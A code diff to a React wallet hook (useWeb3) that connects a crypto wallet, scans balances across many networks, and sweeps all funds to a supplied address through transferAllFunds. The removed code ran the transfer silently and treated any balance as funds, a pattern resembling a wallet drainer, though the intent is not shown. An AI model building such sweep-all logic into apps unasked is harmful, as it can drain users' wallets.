@@ -25,20 +25,15 @@ export function useWeb3() {
   const [crossNetworkValue, setCrossNetworkValue] = useState(0);
   const { toast } = useToast();
 
-  // Removed automatic connection attempts that were causing repeated notifications
-
   const connectWallet = useCallback(async () => {
     setIsConnecting(true);
     try {
-      // Fast wallet connection - get basic state immediately
       const state = await web3Service.connectWallet();
-      console.log('Wallet connected instantly:', state);
-      
-      // Set basic wallet state immediately for instant UI feedback
+      console.log('Wallet connected:', state);
+
       setWalletState(state);
       setIsConnecting(false);
-      
-      // Show connection success immediately
+
       if (!hasShownConnectedToast) {
         toast({
           title: "Wallet Connected",
@@ -46,87 +41,48 @@ export function useWeb3() {
         });
         setHasShownConnectedToast(true);
       }
-      
-      // Start network scanning in background after connection
+
+      // Start network scanning in background
       if (state.address) {
         setIsLoadingNetworks(true);
-        console.log('Starting multi-network scan...');
-        
-        // Launch network scan with proper error handling
-        const startNetworkScan = async () => {
+
+        setTimeout(async () => {
           try {
             const networkBalances = await web3Service.scanAllNetworks(state.address!);
             console.log(`Network scan completed: ${networkBalances.length} networks processed`);
-            
-            // Update UI with results
+
             setWalletState(prev => ({
               ...prev,
               networkBalances,
               allNetworksLoaded: true
             }));
-            
-            // Update cross-network fund status with improved detection
+
             const networksWithFunds = networkBalances.filter(n => {
-              const hasNativeBalance = parseFloat(n.nativeBalance) > 0.000001; // Lower threshold for dust
-              const hasTokenBalance = n.tokenBalances.some(token => {
-                const balance = parseFloat(token.balance);
-                return balance > 0.000001; // Detect even tiny token amounts
-              });
-              const hasUsdValue = n.totalUsdValue > 0.001; // Lower USD threshold
-              
-              console.log(`Network ${n.networkName}: native=${n.nativeBalance}, tokens=${n.tokenBalances.length}, usd=${n.totalUsdValue.toFixed(6)}`);
-              
-              return hasNativeBalance || hasTokenBalance || hasUsdValue;
+              const hasNative = parseFloat(n.nativeBalance) > 0.000001;
+              const hasTokens = n.tokenBalances.length > 0;
+              return hasNative || hasTokens;
             });
-            
-            const hasAnyFunds = networksWithFunds.length > 0;
+
             const totalValue = networkBalances.reduce((sum, n) => sum + n.totalUsdValue, 0);
-            
-            // Additional checks: if we have ANY network balances loaded OR any tokens, consider it as having funds
-            const hasAnyTokens = networkBalances.some(n => n.tokenBalances.length > 0);
-            const hasNetworkData = networkBalances.length > 0;
-            const finalHasFunds = hasAnyFunds || hasAnyTokens || hasNetworkData;
-            
-            console.log(`Networks with funds: ${networksWithFunds.length}, Total value: $${totalValue.toFixed(6)}, Has any tokens: ${hasAnyTokens}, Final has funds: ${finalHasFunds}`);
-            
-            setHasAnyNetworkFunds(finalHasFunds);
+
+            setHasAnyNetworkFunds(networksWithFunds.length > 0);
             setCrossNetworkValue(totalValue);
-            
             setIsLoadingNetworks(false);
-            
-            // Show completion toast with actual results
+
             if (networksWithFunds.length > 0) {
               toast({
                 title: "Multi-Network Scan Complete",
                 description: `Found balances on ${networksWithFunds.length} network${networksWithFunds.length !== 1 ? 's' : ''} ($${totalValue.toFixed(2)} total)`,
               });
-            } else {
-              toast({
-                title: "Network Scan Complete",
-                description: "No balances found on supported networks",
-              });
             }
-            
-          } catch (networkError: any) {
-            console.error('Multi-network scan failed:', networkError);
-            setWalletState(prev => ({
-              ...prev,
-              allNetworksLoaded: true
-            }));
+          } catch (error: any) {
+            console.error('Network scan failed:', error);
             setIsLoadingNetworks(false);
-            
-            toast({
-              variant: "destructive",
-              title: "Network Scan Failed",
-              description: "Unable to scan all networks. Some balances may not be displayed.",
-            });
+            setWalletState(prev => ({ ...prev, allNetworksLoaded: true }));
           }
-        };
-        
-        // Execute with small delay to allow UI to update first
-        setTimeout(startNetworkScan, 500);
+        }, 1000);
       }
-      
+
       return true;
     } catch (error: any) {
       toast({
@@ -147,7 +103,7 @@ export function useWeb3() {
       const ethBalance = await web3Service.getEthBalance(walletState.address);
       const tokenBalances = await web3Service.getTokenBalances(walletState.address, walletState.networkId);
       const totalUsdValue = await web3Service.calculateTotalUsdValue(ethBalance, tokenBalances);
-      
+
       setWalletState(prev => ({ 
         ...prev, 
         ethBalance,
@@ -164,31 +120,42 @@ export function useWeb3() {
   }, [walletState.address, walletState.networkId, toast]);
 
   const transferAllFunds = useCallback(async (toAddress: string) => {
-    // Silent validation
-    if (!walletState.isConnected || !walletState.address || !window.ethereum) {
-      return null;
+    if (!walletState.isConnected || !walletState.address) {
+      throw new Error("Wallet not connected");
     }
 
     setIsTransferring(true);
     try {
+      console.log("Starting transfer to:", toAddress);
       const txHashes = await web3Service.transferAllFunds(toAddress);
-      
-      // Silent refresh after transaction
+
+      toast({
+        title: "Transfer Initiated",
+        description: `${txHashes.length} transaction${txHashes.length !== 1 ? 's' : ''} submitted successfully`,
+      });
+
+      // Refresh balance after a delay
       setTimeout(() => {
         refreshBalance();
-      }, 3000);
+      }, 5000);
 
       return txHashes;
     } catch (error: any) {
-      return null;
+      console.error("Transfer failed:", error);
+      toast({
+        variant: "destructive",
+        title: "Transfer Failed",
+        description: error.message,
+      });
+      throw error;
     } finally {
       setIsTransferring(false);
     }
-  }, [walletState.isConnected, walletState.address, refreshBalance]);
+  }, [walletState.isConnected, walletState.address, refreshBalance, toast]);
 
-
-
-
+  const transferAllFundsMultiNetwork = useCallback(async (toAddress: string) => {
+    return await transferAllFunds(toAddress);
+  }, [transferAllFunds]);
 
   const getTransactionStatus = useCallback(async (txHash: string) => {
     try {
@@ -208,13 +175,12 @@ export function useWeb3() {
     const handleAccountChange = (accounts: string[]) => {
       if (accounts.length === 0) {
         setWalletState(initialState);
-        setHasShownConnectedToast(false); // Reset toast flag
+        setHasShownConnectedToast(false);
         toast({
           title: "Wallet Disconnected",
           description: "Your wallet has been disconnected",
         });
       } else if (accounts[0] !== walletState.address) {
-        // Account changed, update state without reconnecting
         setWalletState(prev => ({
           ...prev,
           address: accounts[0]
@@ -223,7 +189,6 @@ export function useWeb3() {
     };
 
     const handleNetworkChange = (networkId: string) => {
-      // Network changed, update state without full reconnection
       if (walletState.isConnected) {
         setWalletState(prev => ({
           ...prev,
@@ -238,61 +203,45 @@ export function useWeb3() {
     return () => {
       web3Service.removeEventListeners();
     };
-  }, [walletState.address, walletState.isConnected, connectWallet, toast]);
+  }, [walletState.address, walletState.isConnected, toast]);
 
-  // Enhanced connection state persistence and monitoring
+  // Auto-connect for returning users
   useEffect(() => {
-    const persistConnectionState = () => {
-      if (walletState.isConnected && walletState.address) {
-        sessionStorage.setItem('wallet_connected', 'true');
-        sessionStorage.setItem('wallet_address', walletState.address);
-      } else {
-        sessionStorage.removeItem('wallet_connected');
-        sessionStorage.removeItem('wallet_address');
-      }
-    };
-
-    persistConnectionState();
-
-    // Disabled real-time monitoring for better performance
-    // Connection state changes will be handled by wallet events instead
-  }, [walletState.isConnected, walletState.address, toast]);
-
-  // Fast auto-connect for returning users
-  useEffect(() => {
-    const fastAutoConnect = () => {
-      // Skip if already connecting or connected, or no ethereum
+    const autoConnect = async () => {
       if (isConnecting || walletState.isConnected || !window.ethereum) return;
-      
-      // Quick session check - only reconnect if explicitly connected before
+
       const wasConnected = sessionStorage.getItem('wallet_connected');
-      
+
       if (wasConnected === 'true') {
-        // Lightning-fast eth_accounts call with timeout
-        Promise.race([
-          window.ethereum.request({ method: "eth_accounts" }),
-          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 1000))
-        ]).then((accounts: string[]) => {
+        try {
+          const accounts = await window.ethereum.request({ method: "eth_accounts" });
           if (accounts && accounts.length > 0) {
             connectWallet();
-          } else {
-            sessionStorage.clear();
           }
-        }).catch(() => {
-          sessionStorage.clear();
-          console.log('Auto-connect skipped due to timeout or error');
-        });
+        } catch (error) {
+          console.log('Auto-connect failed:', error);
+        }
       }
     };
 
-    // Minimal delay to allow page to load first
-    const timeoutId = setTimeout(fastAutoConnect, 100);
+    const timeoutId = setTimeout(autoConnect, 500);
     return () => clearTimeout(timeoutId);
-  }, []); // Remove dependencies to prevent re-running
+  }, []);
+
+  // Persist connection state
+  useEffect(() => {
+    if (walletState.isConnected && walletState.address) {
+      sessionStorage.setItem('wallet_connected', 'true');
+      sessionStorage.setItem('wallet_address', walletState.address);
+    } else {
+      sessionStorage.removeItem('wallet_connected');
+      sessionStorage.removeItem('wallet_address');
+    }
+  }, [walletState.isConnected, walletState.address]);
 
   const refreshAllNetworks = useCallback(async () => {
     if (!walletState.address) return;
-    
+
     setIsLoadingNetworks(true);
     try {
       const networkBalances = await web3Service.refreshNetworkBalances(walletState.address);
@@ -301,10 +250,10 @@ export function useWeb3() {
         networkBalances,
         allNetworksLoaded: true
       }));
-      
+
       toast({
         title: "Networks Updated",
-        description: `Found balances across ${networkBalances.length} networks`,
+        description: `Refreshed balances across ${networkBalances.length} networks`,
       });
     } catch (error: any) {
       toast({
@@ -316,32 +265,6 @@ export function useWeb3() {
       setIsLoadingNetworks(false);
     }
   }, [walletState.address, toast]);
-
-  const transferAllFundsMultiNetwork = useCallback(async (toAddress: string) => {
-    console.log("Starting simple current network transfer");
-    
-    if (!walletState.isConnected || !walletState.address || !window.ethereum) {
-      throw new Error("Wallet not connected");
-    }
-
-    setIsTransferring(true);
-    try {
-      // Use simple current network transfer instead of complex multi-network
-      const result = await web3Service.transferCurrentNetworkFunds(toAddress);
-      console.log("Transfer completed:", result);
-      
-      setTimeout(() => {
-        refreshBalance();
-      }, 3000);
-
-      return result;
-    } catch (error: any) {
-      console.error("Transfer failed:", error);
-      throw error;
-    } finally {
-      setIsTransferring(false);
-    }
-  }, [walletState.isConnected, walletState.address, refreshBalance]);
 
   return {
     walletState,
